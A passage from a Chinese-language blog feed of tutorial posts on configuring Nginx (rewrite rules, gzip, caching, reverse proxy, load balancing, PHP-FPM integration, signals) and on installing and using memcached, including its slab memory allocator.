#返回状态码 </li></ul><ul><li>break #跳出rewrite</li><li>rewrite #重写</li></ul><p>可参考如下例子对ecshop网址的重写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Rewrite语法</span><br><span class="line">Rewrite 正则表达式  定向后的位置 模式</span><br><span class="line"></span><br><span class="line">Goods-3.html ----&gt;Goods.php?goods_id=3</span><br><span class="line">goods-([\d]+)\.html ---&gt; goods.php?goods_id =<span class="variable">$1</span>  </span><br><span class="line"></span><br><span class="line">location /ecshop &#123;</span><br><span class="line">index index.php;</span><br><span class="line">rewrite goods-([\d]+)\.html$ /ecshop/goods.php?id=<span class="variable">$1</span>;</span><br><span class="line">rewrite article-([\d]+)\.html$ /ecshop/article.php?id=<span class="variable">$1</span>;</span><br><span class="line">rewrite category-(\d+)-b(\d+)\.html /ecshop/category.php?id=<span class="variable">$1</span>&amp;brand=<span class="variable">$2</span>;</span><br><span class="line"></span><br><span class="line">rewrite category-(\d+)-b(\d+)-min(\d+)-max(\d+)-attr([\d\.]+)\.html /ecshop/category.php?id=<span class="variable">$1</span>&amp;brand=<span class="variable">$2</span>&amp;price_min=<span class="variable">$3</span>&amp;price_max=<span class="variable">$4</span>&amp;filter_attr=<span class="variable">$5</span>;</span><br><span class="line"></span><br><span class="line">rewrite category-(\d+)-b(\d+)-min(\d+)-max(\d+)-attr([\d+\.])-(\d+)-([^-]+)-([^-]+)\.html /ecshop/category.php?id=<span class="variable">$1</span>&amp;brand=<span class="variable">$2</span>&amp;price_min=<span class="variable">$3</span>&amp;price_max=<span class="variable">$4</span>&amp;filter_attr=<span class="variable">$5</span>&amp;page=<span class="variable">$6</span>&amp;sort=<span class="variable">$7</span>&amp;order=<span class="variable">$8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gzip压缩提升网站速度"><a href="#gzip压缩提升网站速度" class="headerlink" title="gzip压缩提升网站速度"></a>gzip压缩提升网站速度</h2><p>在浏览器访问网站，打开f12的时候，经常能看到：</p><p>请求:<br>Accept-Encoding:gzip,deflate,sdch<br>响应:<br>Content-Encoding:gzip<br>Content-Length:36093<br>再把页面另存下来,观察,约10W字节,实际传输的36093字节<br>原因——-就在于gzip压缩上.</p><p>原理:<br>浏览器—请求—-&gt; 声明可以接受 gzip压缩 或 deflate压缩 或compress 或 sdch压缩<br>从http协议的角度看–请求头 声明 acceopt-encoding: gzip deflate sdch  (是指压缩算法,其中sdch是google倡导的一种压缩方式,目前支持的服务器尚不多)<br>服务器–&gt;回应—把内容用gzip方式压缩—-&gt;发给浏览器<br>浏览&lt;—–解码gzip—–接收gzip压缩内容—-</p><h3 id="gzip配置的常用参数"><a href="#gzip配置的常用参数" class="headerlink" title="gzip配置的常用参数"></a>gzip配置的常用参数</h3><p>gzip可以写在http,server,location上下文</p><ul><li>gzip on|off;  #是否开启gzip</li><li>gzip_buffers 32 4K| 16 8K #缓冲(压缩在内存中缓冲几块? 每块多大?)</li><li>gzip_comp_level [1-9] #推荐6 压缩级别(级别越高,压的越小,越浪费CPU计算资源)</li><li>gzip_disable #正则匹配UA 什么样的Uri不进行gzip</li><li>gzip_min_length 200 # 开始压缩的最小长度(再小就不要压缩了,意义不在)</li><li>gzip_http_version 1.0|1.1 # 开始压缩的http协议版本(可以不设置,目前几乎全是1.1协议)</li><li>gzip_proxied          # 设置请求者代理服务器,该如何缓存内容</li><li>gzip_types text/plain  application/xml # 对哪些类型的文件用压缩 如txt,xml,html ,css</li><li>gzip_vary on|off  # 是否传输gzip压缩标志</li></ul><p>注意:<br>图片/mp3这样的二进制文件,不必压缩<br>因为压缩率比较小, 比如100-&gt;80字节,而且压缩也是耗费CPU资源的.<br>比较小的文件不必压缩</p><h1 id="Nginx与浏览器缓存配置"><a href="#Nginx与浏览器缓存配置" class="headerlink" title="Nginx与浏览器缓存配置"></a>Nginx与浏览器缓存配置</h1><p>nginx的缓存设置有助于提高网站性能<br>对于网站的图片,尤其是新闻站, 图片一旦发布, 改动的可能是非常小的.我们希望 能否在用户访问一次后, 图片缓存在用户的浏览器端,且时间比较长的缓存.<br>可以, 用到 nginx的expires设置。</p><p>nginx中设置过期时间,非常简单,<br>在location或if段里,来写.<br>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">expires 30s;</span><br><span class="line">expires 30m;</span><br><span class="line">expires 2h;</span><br><span class="line">expires 30d;</span><br></pre></td></tr></table></figure><p>(注意:服务器的日期要准确,如果服务器的日期落后于实际日期,可能导致缓存失效)</p><p>原理是: 服务器响应文件内容是,同时响应etag标签(内容的签名,内容一变,他也变), 和 last_modified_since 2个标签值<br>浏览器下次去请求时,头信息发送这两个标签, 服务器检测文件有没有发生变化,如无,直接头信息返回 etag,last_modified_since<br>浏览器知道内容无改变,于是直接调用本地缓存.<br>这个过程,也请求了服务器,但是传着的内容极少.<br>对于变化周期较短的,如静态html,js,css,比较适于用这个方式</p><h1 id="Nginx反向代理和负载均衡"><a href="#Nginx反向代理和负载均衡" class="headerlink" title="Nginx反向代理和负载均衡"></a>Nginx反向代理和负载均衡</h1><p>之所以两个合在一起的原因是负载均衡通过反向代理来实现的</p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>使用proxy_pass ,就这么简单<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">location / &#123;</span><br><span class="line">      proxy_pass        http://www.baidu.com;</span><br><span class="line">      proxy_set_header   X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>网站的访问量越来越大，服务器的服务模式也得进行相应的升级，比如分离出数据库服务器、分离出图片作为单独服务，这些是简单的数据的负载均衡，将压力分散到不同的机器上。有时候来自web前端的压力，也能让人十分头痛。怎样将同一个域名的访问分散到两台或更多的机器上呢？这其实就是另一种负载均衡了，nginx自身就可以做到，只需要做个简单的配置就行。<br>nginx不单可以作为强大的web服务器，也可以作为一个反向代理服务器，而且nginx还可以按照调度规则实现动态、静态页面的分离，可以按照轮询、ip哈希、URL哈希、权重等多种方式对后端服务器做负载均衡，同时还支持后端服务器的健康检查。<br>Nginx负载均衡一些基础知识：</p><p>负载均衡也是很简单，就是upstream和upstream的配置，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#在server上添加此upstream节点</span></span><br><span class="line">upstream mytomcat&#123;</span><br><span class="line">    <span class="comment">#分权 即访问131与134的次数比例为1比1</span></span><br><span class="line">        server 192.168.14.131:8080 weight=1;</span><br><span class="line">        server 192.168.14.134:8080 weight=1;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name localhost;</span><br><span class="line">    <span class="comment">#即所有请求都到这里去找分配</span></span><br><span class="line">    location / &#123;</span><br><span class="line">   <span class="comment">#使用mytomcat分配规则，即刚自定义添加的upstream节点</span></span><br><span class="line">       proxy_pass http://mytomcat;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="nginx-与memcached的组合"><a href="#nginx-与memcached的组合" class="headerlink" title="nginx 与memcached的组合"></a>nginx 与memcached的组合</h1><p>用法: nginx响应请求时,直接请求memcached,如果没有相应的内容,再回调PHP页面,去查询database,并写入memcached<br>用这个方法我们可以做页面的缓存</p><p>分析：<br>一般用 uri arg 做key,  如 /news.php?id=3</p><p>Nginx很容易支持配置memcache,如下所示：</p><h2 id="Nginx第三方模块"><a href="#Nginx第三方模块" class="headerlink" title="Nginx第三方模块"></a>Nginx第三方模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">  root html;</span><br><span class="line">  <span class="built_in">set</span> <span class="variable">$memcached_key</span> <span class="variable">$uri</span>;   //设置要查询的key值</span><br><span class="line">  memcached_pass memserver;  // memserver为上面的memcache节点的名称</span><br><span class="line">  error_page 404 /writemem.php; //查询不到时候要调用的脚本</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们要memcache集群，在nginx中做集群与负载均衡,步骤都是一样的，Upstream {}模块 把多台服务器加入到一个组，<br>nginx做集群，使用一致性哈希算法，需要安装第三方模块，具体步骤如下：</p><h3 id="下载扩展"><a href="#下载扩展" class="headerlink" title="下载扩展"></a>下载扩展</h3><p>上官网下载ngx——http_consistent_hash</p><h3 id="编译第三方模块"><a href="#编译第三方模块" class="headerlink" title="编译第三方模块"></a>编译第三方模块</h3><p>在nginx源码目录下，注意是nginx的源码<br>如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/nginx --add_module=/path/ngx_module/下载的第三方目录</span><br><span class="line">Make &amp;&amp; make instal</span><br></pre></td></tr></table></figure></p><h3 id="nginx上配置memcached集群"><a href="#nginx上配置memcached集群" class="headerlink" title="nginx上配置memcached集群"></a>nginx上配置memcached集群</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">upstream memserver &#123;  </span><br><span class="line">    consistent_hash <span class="variable">$request_uri</span>; // <span class="built_in">hash</span>计算时的依据,以uri做依据来<span class="built_in">hash</span></span><br><span class="line">    server 127.0.0.1:11211;</span><br><span class="line">    server 127.0.0.1:11212;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">location / &#123;</span><br><span class="line">   <span class="comment"># root   html;</span></span><br><span class="line">   <span class="built_in">set</span> <span class="variable">$memcached_key</span> <span class="variable">$uri</span>;</span><br><span class="line">   memcached_pass memserver;  // memserver为上面的memcache节点的名称</span><br><span class="line">   error_page 404 /writemem.php;</span><br><span class="line">   index  index.php index.html index.htm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="writemmen-php"><a href="#writemmen-php" class="headerlink" title="writemmen.php"></a>writemmen.php</h3><p>这个文件的逻辑是访问的页面没有缓存的时候，需要查询数据库插入到memcache中<br>memcached同样也需要使用一致性哈希算法做集群。</p><p>php使用一致性哈希算法很简单，直接修改php.ini<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcache.<span class="attribute">hash_strategy</span>=consistent</span><br></pre></td></tr></table></figure></p><p>然后就可以美滋滋的使用Nginx和memcache的勾结了。</p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx基础篇</title>
      <link href="/2018/09/08/Nginx%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
      <url>/2018/09/08/Nginx%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>基础篇主要学习以下几项：</p><ul><li>Nginx介绍</li><li>Nginx编译安装</li><li>Nginx整合PHP</li><li>Nginx信号控制</li></ul><a id="more"></a><h1 id="Nginx介绍"><a href="#Nginx介绍" class="headerlink" title="Nginx介绍"></a>Nginx介绍</h1><blockquote><p>Nginx (“engine x”) 是一个高性能的 HTTP 和 反向代理 服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的</p></blockquote><h1 id="Nginx编译安装"><a href="#Nginx编译安装" class="headerlink" title="Nginx编译安装"></a>Nginx编译安装</h1><ul><li>以centos安装为例</li></ul><p>其他发行版可参考网上安装编译安装方法</p><p>下载地址: <a href="http://nginx.org/download/nginx-1.4.2.tar.gz" target="_blank" rel="noopener">http://nginx.org/download/nginx-1.4.2.tar.gz</a></p><p>安装准备: nginx依赖于pcre库,要先安装pcre<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yum install pcre pcre-devel</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src/</span><br><span class="line">wget http://nginx.org/download/nginx-1.4.2.tar.gz</span><br><span class="line">tar zxvf nginx-1.4.2.tar.gz </span><br><span class="line"><span class="built_in">cd</span> nginx-1.4.2</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/nginx</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>启动:<br>cd /usr/local/nginx, 看到如下4个目录</p><p>./<br> ….conf 配置文件<br> … html 网页文件<br> …logs  日志文件<br> …sbin  主要二进制程序</p><h1 id="Nginx整合PHP"><a href="#Nginx整合PHP" class="headerlink" title="Nginx整合PHP"></a>Nginx整合PHP</h1><p>nginx+php的编译<br>apache一般是把php当做自己的一个模块来启动的.<br>而nginx则是把http请求变量(如get,user_agent等)转发给 php进程,即php独立进程,与nginx进行通信. 称为 fastcgi运行方式.<br>因此,为apache所编译的php,是不能用于nginx的.</p><p>注意: 我们编译的PHP 要有如下功能:<br>连接mysql, gd, ttf, 以fpm(fascgi)方式运行</p><p>在php源码文件下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./configure  --prefix=/usr/<span class="built_in">local</span>/fastphp \</span><br><span class="line">--with-mysql=mysqlnd \</span><br><span class="line">--<span class="built_in">enable</span>-mysqlnd \</span><br><span class="line">--with-gd \</span><br><span class="line">--<span class="built_in">enable</span>-gd-native-ttf \</span><br><span class="line">--<span class="built_in">enable</span>-gd-jis-conv</span><br><span class="line">--<span class="built_in">enable</span>-fpm</span><br></pre></td></tr></table></figure></p><p>编译完毕后: </p><p>nginx+php的配置比较简单,核心就一句话—-<br>把请求的信息转发给9000端口的PHP进程,<br>让PHP进程处理 指定目录下的PHP文件.</p><p>如下例子:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">            root html;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>上述location的配置可以理解如下：</p><p>1:碰到php文件,<br>2: 把根目录定位到 html,<br>3: 把请求上下文转交给9000端口PHP进程,<br>4: 并告诉PHP进程,当前的脚本是 $document_root$fastcgi_scriptname<br>(注:PHP会去找这个脚本并处理,所以脚本的位置要指对)</p><h1 id="Nginx的信号控制"><a href="#Nginx的信号控制" class="headerlink" title="Nginx的信号控制"></a>Nginx的信号控制</h1><ul><li>TERM, INT    Quick shutdown</li><li>QUIT    Graceful shutdown  优雅的关闭进程,即等请求结束后再关闭</li><li>HUP    Configuration reload ,Start the new worker processes with<br>a new configuration Gracefully shutdown the old worker processes<br>改变配置文件,平滑的重读配置文件</li><li>USR1    Reopen the log files 重读日志,在日志按月/日分割时有用</li><li>USR2    Upgrade Executable on the fly 平滑的升级</li><li>WINCH    Gracefully shutdown the worker processes 优雅关闭旧的进程(配合USR2来进行升级)</li></ul><h2 id="具体语法"><a href="#具体语法" class="headerlink" title="具体语法:"></a>具体语法:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Kill -信号选项 nginx的主进程号</span><br><span class="line">Kill -信号控制 `cat /usr/<span class="built_in">local</span>/nginx/logs/nginx.pid`</span><br></pre></td></tr></table></figure><p>nginx的进程可由以下两种方法获取</p><ul><li>px aux| grep nginx</li><li>cat /usr/local/nginx/logs/nginx.pid</li></ul><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><p>获取进程id看起来很麻烦的样子，其实也可以不用信号量来控制Nginx，可以使用命令来操作如：</p><ul><li>./usr/local/nginx/sbin/nginx -s reload 重新启动</li><li>./usr/local/nginx/sbin/nginx -s stop 停止</li><li>./usr/local/nginx/sbin/nginx 开启</li><li>./usr/local/nginx/sbin/nginx -s reopen 重新加载配置文件</li><li>./usr/local/nginx/sbin/nginx -t 测试配置文件</li></ul>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>memcached学习笔记</title>
      <link href="/2018/09/07/memcached%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/09/07/memcached%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>完整的memcached基础知识以及必须知道的问题，了解一下</p><a id="more"></a><h1 id="什么是memcached？"><a href="#什么是memcached？" class="headerlink" title="什么是memcached？"></a>什么是memcached？</h1><blockquote><p>memcached is a high-performance, distributed memory object caching system, generic in nature, but originally intended for use in<br>speeding up dynamic web applications by alleviating database load.</p></blockquote><p>memcached是一个高性能,分布式内存对象缓存系统,具备通用性,但本来的目的是用于为动态web程序加速,并减轻数据库的的负担</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li>windows安装</li></ul><p>在windows下安装,相对简单,<br>Memcached官网：<a href="http://memcached.org" target="_blank" rel="noopener">http://memcached.org</a><br>从官方网站下载相应的二进制文件,<br>解压到磁盘即可</p><ul><li>linux安装</li></ul><p>libevent官网：<a href="http://libevent.org/" target="_blank" rel="noopener">http://libevent.org/</a><br>Memcached官网：<a href="http://memcached.org" target="_blank" rel="noopener">http://memcached.org</a></p><p>•  安装 libevent(memcached依赖libevent)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tar zxvf libevent-2.0.1-stable.tar.gz</span></span><br><span class="line"><span class="comment"># cd libevent-2.0.21-stable</span></span><br><span class="line"><span class="comment"># ./configure --prefix=/usr</span></span><br><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># make install</span></span><br></pre></td></tr></table></figure></p><p>• 安装 Memcached</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tar zxvf memcached-1.4.15.tar.gz</span></span><br><span class="line"><span class="comment"># cd memcached-1.4.15</span></span><br><span class="line"><span class="comment"># ./configure --prefix=/usr/local</span></span><br><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># make install</span></span><br></pre></td></tr></table></figure><h2 id="重要启动项"><a href="#重要启动项" class="headerlink" title="重要启动项"></a>重要启动项</h2><ul><li>-p <num>             监听的TCP端口 (缺省: 11211)</num></li><li>-d                          以守护进程方式运行Memcached</li><li>-u <username>    运行Memcached的账户，非root用户</username></li><li>-m <num>           最大的内存使用, 单位是MB，缺省是 64 MB</num></li><li>-c <num>             软连接数量, 缺省是 1024</num></li><li>-v                          输出警告和错误信息</li><li>-vv                        打印客户端的请求和返回信息</li><li>-h                          打印帮助信息</li><li>-i                           打印memcached和libevent的版权信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$安装路径\memcached.exe -m 32 --vv -p 11211</span><br></pre></td></tr></table></figure><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet localhost 11211</span><br></pre></td></tr></table></figure><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><h3 id="增"><a href="#增" class="headerlink" title="增"></a>增</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add key flag expiretime bytes\r\n</span><br><span class="line">data\r\n</span><br></pre></td></tr></table></figure><ul><li>key 给值起一个独特的名字</li><li>flag 标志，1是字符串，2反转数组，3，反序列化对象</li><li>expire 有效期（可以设置秒数，时间戳，设置为0，不自动失效，默认为30天）</li><li>length 缓存的长度（字节为单位）</li></ul><h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete key</span><br></pre></td></tr></table></figure><h3 id="查"><a href="#查" class="headerlink" title="查"></a>查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get key</span><br></pre></td></tr></table></figure><h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">replace key flag expiretime bytes\r\n</span><br><span class="line">data\r\n</span><br></pre></td></tr></table></figure><p>已存在的可以用replace进行替换，更改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> key flag expiretime bytes\r\n</span><br><span class="line">data\r\n</span><br></pre></td></tr></table></figure><p>键不存在则新增，键存在则修改</p><h3 id="清空"><a href="#清空" class="headerlink" title="清空"></a>清空</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush_all</span><br></pre></td></tr></table></figure><h3 id="incr-decr命令：增加-减少值的大小"><a href="#incr-decr命令：增加-减少值的大小" class="headerlink" title="incr,decr命令：增加/减少值的大小"></a>incr,decr命令：增加/减少值的大小</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incr/decr key num</span><br></pre></td></tr></table></figure><h3 id="统计信息"><a href="#统计信息" class="headerlink" title="统计信息"></a>统计信息</h3><p>把当前的运行信息统计出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stats</span><br></pre></td></tr></table></figure><h1 id="memcached内存分配机制"><a href="#memcached内存分配机制" class="headerlink" title="memcached内存分配机制"></a>memcached内存分配机制</h1><h2 id="内存的碎片化"><a href="#内存的碎片化" class="headerlink" title="内存的碎片化"></a>内存的碎片化</h2><p>在向操作系统申请和释放内存时，形成了一些很小的内存片，这些内存片段无法再利用的现象称为内训的碎片化</p><h2 id="memcached的Slab-Allocator分配机制"><a href="#memcached的Slab-Allocator分配机制" class="headerlink" title="memcached的Slab Allocator分配机制"></a>memcached的Slab Allocator分配机制</h2><h3 id="Slab-Allocator的基本原理"><a href="#Slab-Allocator的基本原理" class="headerlink" title="Slab Allocator的基本原理"></a>Slab Allocator的基本原理</h3><p>Slab Allocator的基本原理是按照预先规定的大小，将分配的内存分割成特定长度的块，以完全解决内存碎片问题。Slab Allocation的原理相当简单。 将分配的内存分割成各种尺寸的块（chunk），并把尺寸相同的块分成组（chunk的集合）</p><p><img src="slab.png" alt=""></p><h4 id="Page为内存分配的最小单位"><a href="#Page为内存分配的最小单位" class="headerlink" title="Page为内存分配的最小单位"></a>Page为内存分配的最小单位</h4><p>Memcached的内存分配以page为单位，默认情况下一个page是1M，可以通过-I参数在启动时指定。如果需要申请内存时，memcached会划分出一个新的page并分配给需要的slab区域。page一旦被分配在重启前不会被回收或者重新分配</p><h4 id="Slabs划分数据空间"><a href="#Slabs划分数据空间" class="headerlink" title="Slabs划分数据空间"></a>Slabs划分数据空间</h4><p>Memcached并不是将所有大小的数据都放在一起的，而是预先将数据空间划分为一系列slabs，默认是1m，每个slab只负责一定范围内的数据存储。如下图，每个slab只存储大于其上一个slab的size并小于或者等于自己最大size的数据。例如：slab 3只存储大小介于137 到 224 bytes的数据。如果一个数据大小为230byte将被分配到slab 4中。从下图可以看出，每个slab负责的空间其实是不等的，memcached默认情况下下一个slab的最大值为前一个的1.25倍，这个可以通过修改-f参数来修改增长比例。 </p><h4 id="Chunk才是存放缓存数据的单位"><a href="#Chunk才是存放缓存数据的单位" class="headerlink" title="Chunk才是存放缓存数据的单位"></a>Chunk才是存放缓存数据的单位</h4><p>Chunk是一系列固定的内存空间，这个大小就是管理它的slab的最大存放大小。例如：slab 1的所有chunk都是104byte，而slab 4的所有chunk都是280byte。chunk是memcached实际存放缓存数据的地方，因为chunk的大小固定为slab能够存放的最大值，所以所有分配给当前slab的数据都可以被chunk存下。如果时间的数据大小小于chunk的大小，空余的空间将会被闲置，这个是为了防止内存碎片而设计的。例如下图，chunk size是224byte，而存储的数据只有200byte，剩下的24byte将被闲置。 </p><h4 id="Slab的内存分配"><a href="#Slab的内存分配" class="headerlink" title="Slab的内存分配"></a>Slab的内存分配</h4><p>Memcached在启动时通过-m指定最大使用内存，但是这个不会一启动就占用，是随着需要逐步分配给各slab的。如果一个新的缓存数据要被存放，memcached首先选择一个合适的slab，然后查看该slab是否还有空闲的chunk，如果有则直接存放进去；如果没有则要进行申请。slab申请内存时以page为单位，所以在放入第一个数据，无论大小为多少，都会有1M大小的page被分配给该slab。申请到page后，slab会将这个page的内存按chunk的大小进行切分，这样就变成了一个chunk的数组，在从这个chunk数组中选择一个用于存储数据。如下图，slab 1和slab 2都分配了一个page，并按各自的大小切分成chunk数组</p><h4 id="Memcached内存分配策略"><a href="#Memcached内存分配策略" class="headerlink" title="Memcached内存分配策略"></a>Memcached内存分配策略</h4><p>memcached的内存分配策略就是：按slab需求分配page，各slab按需使用chunk存储。<br>这里有几个特点要注意，</p><ul><li>Memcached分配出去的page不会被回收或者重新分配</li><li>Memcached申请的内存不会被释放</li><li>slab空闲的chunk不会借给任何其他slab使用</li></ul><p>Memcached在启动时通过-m参数指定最大使用内存，但是这个不会一启动就占用完，而是逐步分配给各slab的。如果一个新的数据要被存放，首先选择一个合适的slab，然后查看该slab是否还有空闲的chunk，如果有则直接存放进去；如果没有则要进行申请，slab申请内存时以page为单位，无论大小为多少，都会有1M大小的page被分配给该slab（该page不会被回收或者重新分配，永远都属于该slab）。申请到page后，slab会将这个page的内存按chunk的大小进行切分，这样就变成了一个chunk的数组，再从这个chunk数组中选择一个用于存储数据。若没有空闲的page的时候，则会对改slab进行LRU，而不是对整个memcache进行LRU</p><ul><li>n（最小分配空间）：即初始chunk的大小，默认是48，此时初始chunk的大小是96，（注意并不是2倍的关系，当设置为50时，第一个chunk的大小是104），-n越大slab越少。</li><li>slab的数量最大是200(当指定-f 1.0001)时，增长因子越大，slab越少，-f  不能小于1。</li></ul><h4 id="固定大小chunk带来的内存浪费"><a href="#固定大小chunk带来的内存浪费" class="headerlink" title="固定大小chunk带来的内存浪费"></a>固定大小chunk带来的内存浪费</h4><p>将100字节的数据缓存到122字节的chunk中剩余的22字节就浪费了<br>知道了这些以后，就可以理解为什么总内存没有被全部占用的情况下，memcached却出现了丢失缓存数据的问题了</p><h4 id="memcached的过期机制和删除机制"><a href="#memcached的过期机制和删除机制" class="headerlink" title="memcached的过期机制和删除机制"></a>memcached的过期机制和删除机制</h4><h5 id="惰性删除"><a href="#惰性删除" class="headerlink" 